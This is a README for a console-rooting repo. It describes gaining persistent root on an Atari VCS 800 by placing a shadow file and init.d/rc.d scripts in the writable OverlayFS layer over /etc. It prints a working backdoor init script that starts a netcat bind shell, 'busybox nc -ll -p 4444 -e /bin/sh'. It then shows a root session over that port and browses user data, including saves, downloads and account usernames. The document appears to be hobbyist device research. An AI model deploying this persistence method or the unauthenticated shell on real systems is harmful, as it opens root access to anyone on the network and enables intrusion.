# AtariVCSroot

Atari VCS 800 - https://atarivcs.com/atari-vcs-800-black-walnut-all-in-bundle/

The following file systems are present on the VCS
```
/ # fdisk -l 
Disk /dev/mmcblk0: 29.2 GiB, 31306285056 bytes, 61145088 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
Disklabel type: gpt
Disk identifier: C30F3CC4-E0B8-480A-B0FD-406A1ABF6E85

Device           Start      End  Sectors   Size Type
/dev/mmcblk0p1    3906   500000   496095 242.2M EFI System
/dev/mmcblk0p2  500001   750000   250000 122.1M EFI System
/dev/mmcblk0p3  750001  1000000   250000 122.1M EFI System
/dev/mmcblk0p4 1000001  1500000   500000 244.1M Linux filesystem
/dev/mmcblk0p5 1500001  2000000   500000 244.1M unknown
/dev/mmcblk0p6 2000001  2500000   500000 244.1M unknown
/dev/mmcblk0p7 2500001  5250000  2750000   1.3G Linux root (x86-64)
/dev/mmcblk0p8 5250001  8000000  2750000   1.3G Linux root (x86-64)
/dev/mmcblk0p9 8000001 61145054 53145054  25.3G Linux home
```

The system runs Apertis Linux - https://www.apertis.org
```
/ # cat /etc/issue	
Apertis v2020 \n \l
```

Multiple partitions are for use by the running Apertis instance.<br>
/dev/mmcblk0p4 is the /var partition for Apertis<br>
/dev/mmcblk0p5 is the DM_verity_hash for p7
/dev/mmcblk0p6 is the DM_verity_hash for p8
/dev/mmcblk0p7 is the main linux OS<br>
/dev/mmcblk0p8 is the backup linux OS<br>
/dev/mmcblk0p9 is the /home partition for Apertis<br>

When the VCS boots rapidly pressing <ctrl+c> will interrupt the systemd startup scripts. Eventually you will be left with a black screen. Pressing <alt+f1> through <alt+f6> will allow access to tty's that can be used for login.<br>

The exploit in this repo takes advantage of the OverlayFS used by the system.<br>
```
/ # mount|grep overlay
overlay on /etc type overlay (rw,relatime,lowerdir=/root/etc,upperdir=/root/var/lib/overlays/etc/upper,workdir=/root/var/lib/overlays/etc/work)
```

Merging in malicious files into /etc allows for easy persistent root access. In this case we add a shadow file, and a few init.d scripts to trigger via rc.d runlevels 3-4. 
```
/ # ls /var/lib/overlays/etc/upper 
NetworkManager
init.d
localtime
machine-id
mtab
rc3.d
rc4.d
rc5.d
resolv.conf
shadow
timezone
```

A simple backdoor allows for convienent access on demand via tty, or tcp port. 
```
/ # cat /var/lib/overlays/etc/upper/init.d/backdoor
#! /bin/sh
. /lib/lsb/init-functions

set -e

case "$1" in
  start)
        busybox nc -ll -p 4444 -e /bin/sh &
        ;;
  stop|reload|restart|force-reload|status)
        ;;
  *)
        echo "Usage: backdoor {start|stop|restart|force-reload|status}" >&2
        exit 1
        ;;
esac

exit 0
```

If you login via the tty, and wish to start the graphical envrionment, simply type:
```
systemctl isolate graphical.target
```

Once you've gained root access via this repo you should see the following result:
```
$ nc -vvv 192.168.1.28 4444
Connection to 192.168.1.28 port 4444 [tcp/krb524] succeeded!
ash -i

BusyBox v1.30.1 (Apertis 1:1.30.1-4co1bv2020preb1) built-in shell (ash)
Enter 'help' for a list of built-in commands.

/ # id
uid=0(root) gid=0(root)
/ # uname -a
Linux atari-vcs 5.4.0-3-amd64 #1 SMP Debian 5.4.13-2ata12~~+104+g85b9705cd (2020-07-28) x86_64 GNU/Linux
/ # mount
sysfs on /sys type sysfs (rw,nosuid,nodev,noexec,relatime)
proc on /proc type proc (rw,nosuid,nodev,noexec,relatime)
udev on /dev type devtmpfs (rw,nosuid,relatime,size=2989708k,nr_inodes=747427,mode=755)
devpts on /dev/pts type devpts (rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=000)
tmpfs on /run type tmpfs (rw,nosuid,noexec,relatime,size=602640k,mode=755)
/dev/mapper/root on / type ext4 (ro,noatime,errors=remount-ro)
/dev/mmcblk0p4 on /var type ext4 (rw,relatime)
overlay on /etc type overlay (rw,relatime,lowerdir=/root/etc,upperdir=/root/var/lib/overlays/etc/upper,workdir=/root/var/lib/overlays/etc/work)
securityfs on /sys/kernel/security type securityfs (rw,nosuid,nodev,noexec,relatime)
tmpfs on /dev/shm type tmpfs (rw,nosuid,nodev)
tmpfs on /run/lock type tmpfs (rw,nosuid,nodev,noexec,relatime,size=5120k)
tmpfs on /sys/fs/cgroup type tmpfs (ro,nosuid,nodev,noexec,mode=755)
cgroup2 on /sys/fs/cgroup/unified type cgroup2 (rw,nosuid,nodev,noexec,relatime,nsdelegate)
cgroup on /sys/fs/cgroup/systemd type cgroup (rw,nosuid,nodev,noexec,relatime,xattr,name=systemd)
pstore on /sys/fs/pstore type pstore (rw,nosuid,nodev,noexec,relatime)
efivarfs on /sys/firmware/efi/efivars type efivarfs (rw,nosuid,nodev,noexec,relatime)
none on /sys/fs/bpf type bpf (rw,nosuid,nodev,noexec,relatime,mode=700)
cgroup on /sys/fs/cgroup/net_cls,net_prio type cgroup (rw,nosuid,nodev,noexec,relatime,net_cls,net_prio)
cgroup on /sys/fs/cgroup/pids type cgroup (rw,nosuid,nodev,noexec,relatime,pids)
cgroup on /sys/fs/cgroup/memory type cgroup (rw,nosuid,nodev,noexec,relatime,memory)
cgroup on /sys/fs/cgroup/devices type cgroup (rw,nosuid,nodev,noexec,relatime,devices)
cgroup on /sys/fs/cgroup/cpu,cpuacct type cgroup (rw,nosuid,nodev,noexec,relatime,cpu,cpuacct)
cgroup on /sys/fs/cgroup/freezer type cgroup (rw,nosuid,nodev,noexec,relatime,freezer)
cgroup on /sys/fs/cgroup/rdma type cgroup (rw,nosuid,nodev,noexec,relatime,rdma)
cgroup on /sys/fs/cgroup/blkio type cgroup (rw,nosuid,nodev,noexec,relatime,blkio)
cgroup on /sys/fs/cgroup/perf_event type cgroup (rw,nosuid,nodev,noexec,relatime,perf_event)
cgroup on /sys/fs/cgroup/cpuset type cgroup (rw,nosuid,nodev,noexec,relatime,cpuset)
systemd-1 on /proc/sys/fs/binfmt_misc type autofs (rw,relatime,fd=40,pgrp=1,timeout=0,minproto=5,maxproto=5,direct,pipe_ino=5282)
debugfs on /sys/kernel/debug type debugfs (rw,relatime)
hugetlbfs on /dev/hugepages type hugetlbfs (rw,relatime,pagesize=2M)
tmpfs on /tmp type tmpfs (rw,nosuid,nodev)
tmpfs on /media type tmpfs (rw,relatime,mode=755)
mqueue on /dev/mqueue type mqueue (rw,relatime)
/dev/mmcblk0p2 on /boot/efi type vfat (rw,relatime,fmask=0022,dmask=0022,codepage=437,iocharset=ascii,shortname=mixed,utf8,errors=remount-ro)
tmpfs on /var/tmp type tmpfs (rw,nosuid,nodev)
/dev/mmcblk0p9 on /home type ext4 (rw,relatime,x-systemd.growfs)
tmpfs on /run/user/1000 type tmpfs (rw,nosuid,nodev,relatime,size=602640k,mode=700,uid=1000,gid=1000)
/dev/sda3 on /media/user/writable type ext4 (rw,nosuid,nodev,relatime,sync,uhelper=udisks2)
/ # busybox ps
PID   USER     COMMAND
    1 root     {systemd} /sbin/init splash
    2 root     [kthreadd]
    3 root     [rcu_gp]
    4 root     [rcu_par_gp]
    5 root     [kworker/0:0-eve]
    6 root     [kworker/0:0H]
    7 root     [kworker/0:1-eve]
    8 root     [kworker/u16:0-e]
    9 root     [mm_percpu_wq]
   10 root     [ksoftirqd/0]
   11 root     [rcu_sched]
   12 root     [migration/0]
   13 root     [cpuhp/0]
   14 root     [cpuhp/1]
   15 root     [migration/1]
   16 root     [ksoftirqd/1]
   17 root     [kworker/1:0-eve]
   18 root     [kworker/1:0H-kb]
   19 root     [cpuhp/2]
   20 root     [migration/2]
   21 root     [ksoftirqd/2]
   22 root     [kworker/2:0-eve]
   23 root     [kworker/2:0H-kb]
   24 root     [cpuhp/3]
   25 root     [migration/3]
   26 root     [ksoftirqd/3]
   27 root     [kworker/3:0-eve]
   28 root     [kworker/3:0H-kb]
   29 root     [kdevtmpfs]
   30 root     [netns]
   31 root     [kauditd]
   32 root     [khungtaskd]
   33 root     [oom_reaper]
   34 root     [writeback]
   35 root     [kcompactd0]
   36 root     [ksmd]
   37 root     [khugepaged]
   39 root     [kworker/2:1-eve]
   40 root     [kworker/u16:1-k]
   82 root     [kintegrityd]
   83 root     [kblockd]
   84 root     [blkcg_punt_bio]
   85 root     [edac-poller]
   86 root     [devfreq_wq]
   87 root     [kswapd0]
   88 root     [kthrotld]
   89 root     [irq/25-aerdrv]
   90 root     [irq/26-aerdrv]
   91 root     [irq/28-aerdrv]
   92 root     [kworker/1:1-eve]
   93 root     [kworker/3:1-eve]
   94 root     [acpi_thermal_pm]
   95 root     [ipv6_addrconf]
  106 root     [kstrp]
  110 root     [kworker/u17:0-h]
  143 root     [kworker/0:2-eve]
  154 root     [sdhci]
  155 root     [irq/7-mmc0]
  156 root     [kworker/3:2-eve]
  159 root     [kworker/u16:2-k]
  160 root     [ata_sff]
  163 root     [scsi_eh_0]
  164 root     [scsi_tmf_0]
  165 root     [mmc_complete]
  166 root     [kworker/2:1H-kb]
  167 root     [kworker/3:1H-kb]
  168 root     [kworker/1:1H-ev]
  169 root     [kworker/1:2-pm]
  170 root     [kworker/3:2H-kb]
  171 root     [kworker/0:1H-kb]
  172 root     [kworker/2:2H-mm]
  173 root     [kworker/2:3H-mm]
  174 root     [ttm_swap]
  175 root     [gfx]
  176 root     [comp_1.0.0]
  177 root     [comp_1.1.0]
  178 root     [comp_1.2.0]
  179 root     [comp_1.3.0]
  180 root     [comp_1.0.1]
  181 root     [comp_1.1.1]
  182 root     [comp_1.2.1]
  183 root     [comp_1.3.1]
  184 root     [sdma0]
  185 root     [vcn_dec]
  186 root     [vcn_enc0]
  187 root     [vcn_enc1]
  188 root     [vcn_jpeg]
  189 root     [kworker/1:3-eve]
  196 root     [scsi_eh_1]
  197 root     [scsi_tmf_1]
  198 root     [usb-storage]
  203 root     [kdmflush]
  205 root     [kworker/2:2-eve]
  206 root     [dm_bufio_cache]
  207 root     [kverityd]
  209 root     [kworker/0:2H-kb]
  222 root     [kworker/u16:3-k]
  223 root     [kworker/u16:4-k]
  224 root     [jbd2/dm-0-8]
  225 root     [ext4-rsv-conver]
  231 root     [jbd2/mmcblk0p4-]
  232 root     [ext4-rsv-conver]
  264 root     [kworker/1:2H-kb]
  266 root     /lib/systemd/systemd-journald
  278 root     /lib/systemd/systemd-udevd
  279 root     [kworker/2:3-eve]
  325 root     [watchdogd]
  326 root     [tpm_dev_wq]
  327 root     [kworker/u16:5-f]
  335 root     [cryptd]
  346 root     [cfg80211]
  389 root     [kworker/u16:6-k]
  437 root     [kworker/u16:7-c]
  441 root     [kworker/2:4H]
  447 root     [kworker/3:3H-kb]
  455 root     [kworker/3:3-eve]
  457 root     [kworker/0:3-mem]
  458 root     [kworker/0:4-eve]
  464 root     [irq/45-rtwpci]
  467 root     [kworker/u17:1-h]
  468 root     [kworker/u17:2-h]
  469 root     [kworker/3:4H]
  478 root     [kworker/1:3H]
  480 root     [jbd2/mmcblk0p9-]
  481 root     [ext4-rsv-conver]
  489 systemd- /lib/systemd/systemd-timesyncd
  609 messageb /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
  611 root     /lib/systemd/systemd-logind
  612 root     /usr/lib/bluetooth/bluetoothd
  613 root     /usr/sbin/NetworkManager --no-daemon
  614 root     /usr/lib/udisks2/udisksd
  616 root     /usr/bin/companion-app-daemon
  617 root     /sbin/wpa_supplicant -u -s -O /run/wpa_supplicant
  626 root     busybox nc -ll -p 4444 -e /bin/sh
  629 polkitd  /usr/lib/polkit-1/polkitd --no-debug
  649 user     /usr/bin/systemctl --wait --user start atari-session.target
  656 user     /lib/systemd/systemd --user
  657 user     (sd-pam)
  666 user     (sd-pam)
  667 user     /usr/bin/dbus-daemon --session --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
  668 user     /usr/bin/weston -i 0 --xwayland --modules systemd-notify.so
  678 user     /usr/lib/x86_64-linux-gnu/weston-keyboard
  679 user     /usr/local/dashboard/Dashboard
  683 root     /usr/bin/rauc --mount=/run/rauc service
  691 user     /usr/lib/x86_64-linux-gnu/weston-desktop-shell
  695 user     /usr/bin/Xwayland :0 -rootless -listen 59 -listen 60 -wm 61 -terminate
  746 user     /usr/bin/pulseaudio --daemonize=no
  750 root     [krfcommd]
  756 user     /usr/lib/x86_64-linux-gnu/system-bridge-daemon
  763 root     /usr/libexec/fwupd/fwupd
  775 root     /usr/lib/upower/upowerd
  798 root     /usr/lib/x86_64-linux-gnu/bundle-handler
  830 root     [jbd2/sda3-8]
  831 root     [ext4-rsv-conver]
  851 root     [kworker/2:4-eve]
  852 root     [kworker/2:5-eve]
  861 root     [kworker/3:4-eve]
  867 root     /bin/sh
  868 root     ash -i
  872 root     busybox ps
```

Atari Online gaming data for each user is stored in /home/user/.var/bundles and /home/user/.config/unity3d/Atari/Dashboard/Production/GameDoc/Users/<br>

```
/ # ls  /home/user/.var/bundles 
xxdd0ddd\xCdbd3f\xff4f75\x2dttd9\x2drdaehh3fjj17
guest\x2duser
```

Chrome Downloads are among the things you can find in these directories. 
```
/home/user/.var/bundles # find . -name Downloads
./xxdd0ddd\xCdbd3f\xff4f75\x2dttd9\x2drdaehh3fjj17/S9d8oFdW8umLtTUp/Downloads

```

Individual game savestates and highscores are stored with refrences to the vendor. In this case you can see Jetboard Joust by BitBull - http://jetboardjoust.bitbull.com<br>

```
/# cd /home/user/.var/bundles/xxdd0ddd\xCdbd3f\xff4f75\x2dttd9\x2drdaehh3fjj17

/home/user/.var/bundles/xxdd0ddd\xCdbd3f\xff4f75\x2dttd9\x2drdaehh3fjj17 # ls */*
QJ3X3aqmEI43VlIo/com.bitbull.jbj:
com.bitbull.generic.gp
com.bitbull.generic.ldbrd.ldbrd_highscores
com.bitbull.generic.stats
gamedata
jbjsettings
playerstate.00
playerstate.01
playerstate.02
playerstate.03
playerstate.04
versioninfo

/home/user/.var/bundles/xxdd0ddd\xCdbd3f\xff4f75\x2dttd9\x2drdaehh3fjj17/QJ3X3aqmEI43VlIo/com.bitbull.jbj # busybox xxd com.bitbull.generic.ldbrd.ldbrd_highscores
00000000: 0900 0000 0366 6676 0000 0000 0004 6e61  .....ffv......na
00000010: 6d65 0310 4c44 4252 445f 4849 4748 5343  me..LDBRD_HIGHSC
00000020: 4f52 4553 0564 6e61 6d65 030e 6869 6768  ORES.dname..high
00000030: 6573 7420 7363 6f72 6573 0473 6f72 7400  est scores.sort.
00000040: 0000 0000 0764 6973 706c 6179 0000 0000  .....display....
00000050: 000e 6469 7370 6c61 795f 666f 726d 6174  ..display_format
00000060: 0000 0000 0003 6d61 7800 0f00 0000 0370  ......max......p
00000070: 6d76 0100 0000 0007 656e 7472 6965 730d  mv......entries.
00000080: 1300 0000 fd01 00e8 0300 0007 6a65 742d  ............jet-
00000090: 626f 7901 0000 0084 0300 0007 6a65 742d  boy.........jet-
000000a0: 626f 7902 0000 0020 0300 0007 6a65 742d  boy.... ....jet-
000000b0: 626f 7903 0000 00bc 0200 0007 6a65 742d  boy.........jet-
000000c0: 626f 7904 0000 0058 0200 0007 6a65 742d  boy....X....jet-
000000d0: 626f 7905 0000 00f4 0100 0007 6a65 742d  boy.........jet-
000000e0: 626f 7906 0000 0090 0100 0007 6a65 742d  boy.........jet-
000000f0: 626f 7907 0000 002c 0100 0007 6a65 742d  boy....,....jet-
00000100: 626f 7908 0000 00c8 0000 0007 6a65 742d  boy.........jet-
00000110: 626f 7909 0000 0064 0000 0007 6a65 742d  boy....d....jet-
00000120: 626f 790a 0000 005a 0000 0007 6a65 742d  boy....Z....jet-
00000130: 626f 790b 0000 0050 0000 0007 6a65 742d  boy....P....jet-
00000140: 626f 790c 0000 0046 0000 0007 6a65 742d  boy....F....jet-
00000150: 626f 790d 0000 003c 0000 0007 6a65 742d  boy....<....jet-
00000160: 626f 790e 0000 0032 0000 0007 6a65 742d  boy....2....jet-
00000170: 626f 790f 0000 0028 0000 0007 6a65 742d  boy....(....jet-
00000180: 626f 7910 0000 001e 0000 0007 6a65 742d  boy.........jet-
00000190: 626f 7911 0000 0014 0000 0007 6a65 742d  boy.........jet-
000001a0: 626f 7912 0000 000a 0000 0007 6a65 742d  boy.........jet-
000001b0: 626f 7913 0000 00                        boy....

/home/user/.var/bundles/xxdd0ddd\xCdbd3f\xff4f75\x2dttd9\x2drdaehh3fjj17/QJ3X3aqmEI43VlIo/com.bitbull.jbj # busybox xxd com.bitbull.generic.stats
00001cc0: 5f4d 4153 5445 5200 1241 4348 565f 5048  _MASTER..ACHV_PH
00001cd0: 4153 4552 5f4d 4153 5445 5200 1341 4348  ASER_MASTER..ACH
00001ce0: 565f 424c 4153 5445 525f 4d41 5354 4552  V_BLASTER_MASTER
00001cf0: 0015 4143 4856 5f4c 4754 4e47 424f 4c54  ..ACHV_LGTNGBOLT
00001d00: 5f4d 4153 5445 5200 1441 4348 565f 464c  _MASTER..ACHV_FL
00001d10: 4d54 524e 444f 5f4d 4153 5445 5200 1041  MTRNDO_MASTER..A
00001d20: 4348 565f 524f 544f 5f4d 4153 5445 5200  CHV_ROTO_MASTER.
00001d30: 1241 4348 565f 4d49 4e49 4f4e 5f4b 494c  .ACHV_MINION_KIL
00001d40: 4c45 5201 1141 4348 565f 4452 4f4e 455f  LER..ACHV_DRONE_
00001d50: 4b49 4c4c 4552 0013 4143 4856 5f47 524f  KILLER..ACHV_GRO
00001d60: 5550 4552 5f4b 494c 4c45 5200 1241 4348  UPER_KILLER..ACH
00001d70: 565f 5245 4150 4552 5f4b 494c 4c45 5200  V_REAPER_KILLER.
00001d80: 1441 4348 565f 4153 5341 5353 494e 5f4b  .ACHV_ASSASSIN_K
00001d90: 494c 4c45 5200 1541 4348 565f 424f 4459  ILLER..ACHV_BODY
00001da0: 4755 4152 445f 4b49 4c4c 4552 0012 4143  GUARD_KILLER..AC
00001db0: 4856 5f4d 5554 414e 545f 4b49 4c4c 4552  HV_MUTANT_KILLER
00001dc0: 0013 4143 4856 5f42 4153 5441 5244 5f4b  ..ACHV_BASTARD_K
00001dd0: 494c 4c45 5200 1141 4348 565f 4e49 4e4a  ILLER..ACHV_NINJ
00001de0: 415f 4b49 4c4c 4552 0018 4143 4856 5f4d  A_KILLER..ACHV_M
00001df0: 4153 5445 524d 494e 494f 4e5f 4b49 4c4c  ASTERMINION_KILL
00001e00: 4552 0018 4143 4856 5f4d 4544 4941 4e4d  ER..ACHV_MEDIANM
00001e10: 494e 494f 4e5f 4b49 4c4c 4552 0010 4143  INION_KILLER..AC
00001e20: 4856 5f54 4855 475f 4b49 4c4c 4552 0015  HV_THUG_KILLER..
00001e30: 4143 4856 5f41 4747 5245 5353 4f52 5f4b  ACHV_AGGRESSOR_K
00001e40: 494c 4c45 5200 1441 4348 565f 4755 4152  ILLER..ACHV_GUAR
00001e50: 4449 414e 5f4b 494c 4c45 5200 1341 4348  DIAN_KILLER..ACH
00001e60: 565f 5357 4152 4d45 525f 4b49 4c4c 4552  V_SWARMER_KILLER
00001e70: 0017 4143 4856 5f4d 494e 4950 524f 4444  ..ACHV_MINIPRODD
00001e80: 4552 5f4b 494c 4c45 5200 1241 4348 565f  ER_KILLER..ACHV_
00001e90: 424f 4d42 4552 5f4b 494c 4c45 5200 1341  BOMBER_KILLER..A
00001ea0: 4348 565f 494e 5641 4445 525f 4b49 4c4c  CHV_INVADER_KILL
00001eb0: 4552 0017 4143 4856 5f4c 4954 544c 4542  ER..ACHV_LITTLEB
00001ec0: 5354 5244 5f4b 494c 4c45 5200 1441 4348  STRD_KILLER..ACH
00001ed0: 565f 534b 5945 4241 4c4c 5f4b 494c 4c45  V_SKYEBALL_KILLE
00001ee0: 5200 1541 4348 565f 4a45 4c4c 5946 4953  R..ACHV_JELLYFIS
00001ef0: 485f 4b49 4c4c 4552 0017 4143 4856 5f4d  H_KILLER..ACHV_M
00001f00: 494e 4953 574f 4f50 4552 5f4b 494c 4c45  INISWOOPER_KILLE
00001f10: 5200 1241 4348 565f 4d4f 5448 4552 5f4b  R..ACHV_MOTHER_K
00001f20: 494c 4c45 5200 1441 4348 565f 5351 554f  ILLER..ACHV_SQUO
00001f30: 434b 4554 5f4b 494c 4c45 5200 1341 4348  CKET_KILLER..ACH
00001f40: 565f 5357 4f4f 5045 525f 4b49 4c4c 4552  V_SWOOPER_KILLER
00001f50: 0014 4143 4856 5f53 504c 4954 5445 525f  ..ACHV_SPLITTER_
00001f60: 4b49 4c4c 4552 0014 4143 4856 5f53 4e41  KILLER..ACHV_SNA
00001f70: 5443 4845 525f 4b49 4c4c 4552 0014 4143  TCHER_KILLER..AC
00001f80: 4856 5f57 5249 4747 4c45 525f 4b49 4c4c  HV_WRIGGLER_KILL
00001f90: 4552 0018 4143 4856 5f4d 494e 4953 5155  ER..ACHV_MINISQU
00001fa0: 4f43 4b45 545f 4b49 4c4c 4552 0014 4143  OCKET_KILLER..AC
00001fb0: 4856 5f53 4355 5454 4c45 525f 4b49 4c4c  HV_SCUTTLER_KILL
00001fc0: 4552 0013 4143 4856 5f43 5241 574c 4552  ER..ACHV_CRAWLER
00001fd0: 5f4b 494c 4c45 5200 1341 4348 565f 5052  _KILLER..ACHV_PR
00001fe0: 4f44 4445 525f 4b49 4c4c 4552 0014 4143  ODDER_KILLER..AC
00001ff0: 4856 5f42 455a 4552 4b45 525f 4b49 4c4c  HV_BEZERKER_KILL
00002000: 4552 0017 4143 4856 5f53 5745 4550 4552  ER..ACHV_SWEEPER
00002010: 4d49 4e49 5f4b 494c 4c45 5200 1341 4348  MINI_KILLER..ACH
00002020: 565f 5357 4545 5045 525f 4b49 4c4c 4552  V_SWEEPER_KILLER
00002030: 0015 4143 4856 5f42 4947 424f 4d42 4552  ..ACHV_BIGBOMBER
00002040: 5f4b 494c 4c45 5200 1741 4348 565f 4d53  _KILLER..ACHV_MS
00002050: 5356 4241 5354 4152 445f 4b49 4c4c 4552  SVBASTARD_KILLER
00002060: 0013 4143 4856 5f53 5049 5454 4552 5f4b  ..ACHV_SPITTER_K
00002070: 494c 4c45 5200 1341 4348 565f 4348 4f4d  ILLER..ACHV_CHOM
00002080: 5045 525f 4b49 4c4c 4552 0013 4143 4856  PER_KILLER..ACHV
00002090: 5f44 524f 5050 4552 5f4b 494c 4c45 5200  _DROPPER_KILLER.
000020a0: 1441 4348 565f 4755 4552 494c 4c41 5f4b  .ACHV_GUERILLA_K
000020b0: 494c 4c45 5200                           ILLER.


```

Your actual Atari Online usernames are used to store three files [GameResponse, AppResponse, and PortalSortInfo] in an unkown, potentially encrypted data blob in the unity3d .config folder for Dashboard.<br>

```
/ # ls /home/user/.config/unity3d/Atari/Dashboard/Production/GameDoc/Users/
guest@atari.com
xxxx@hostile.com
```

The root of the Dashboard appears to use some sort of encrypted file names. 
```
/home/user/.config/unity3d/Atari/Dashboard/Production # find / -name QJ3X3aqmEI43VlIo
/home/user/.var/bundles/xxdd0ddd\xCdbd3f\xff4f75\x2dttd9\x2drdaehh3fjj17/QJ3X3aqmEI43VlIo
/home/user/.config/unity3d/Atari/Dashboard/Production/QJ3X3aqmEI43VlIo
/home/games/QJ3X3aqmEI43VlIo

/home/user/.config/unity3d/Atari/Dashboard/Production # ls
30IZiAqvkNhYpiE8
3dyv7oqb3B5klfWY
4dTAj7qq1cp0N8uE
A0q71HVdpHEREjGD
AGBCEYkKksuUbSVD
Avatars
D7dRhBlJpEbVUilw
G2H5H0a1HNIpBk5J
GameDoc
Games
HQjdYXFrN5R91qTE
IUJDZUqc9W4UH6J4
IgQdDIo4YdaYfrYL
J5BPDE1J4Zzuadwk
LegalDocuments
MEIsu5GFTvy55EUB
MzIVchJdPUeP3US6
NYG6ymDsaSUSkNIg
Oi2cVzhnbDQStiqw
PQ4lbraxQHzZl0c4
PaymentDocuments
PdICQa4I0ieL5xjP
QJ3X3aqmEI43VlIo
QMMOUiBuJKmIyDQk
QhIJPMnQ5i22tF45
ROQ2DHEMzUYw0iB7
Rrb3K374DBVsW6X0
S9d8oFdW8umLtTUp
SSjpl3UKqfFqiv8I
StoreProducts
Temp
Tlbuqp5kdlo2VM00
XbZ0COAn3dvEf98C
Z6onvnNHvoP5gmWW
ZJ9R0woSvslBas8P
a3EkweYCQWsHapmd
antstream
avuddgyPB1HbAucK
bZ4duhDb4ZqLCpXW
disneyplus
ebKl0OqR8NU6VtZm
fSrtuhIsAVIzEXjY
fioogsgMJGC7d7GF
h4KdQezG14uuRGYr
netflix
pay5glQGQOgMmDFz
sCOFpCuQ2ctJexXX
sandbox
vault
vzTtf4Ftq7TC1NHn
youtube
zDSLqU2ljeOAKfIu
zObR3WwMK9cCTxfj

```
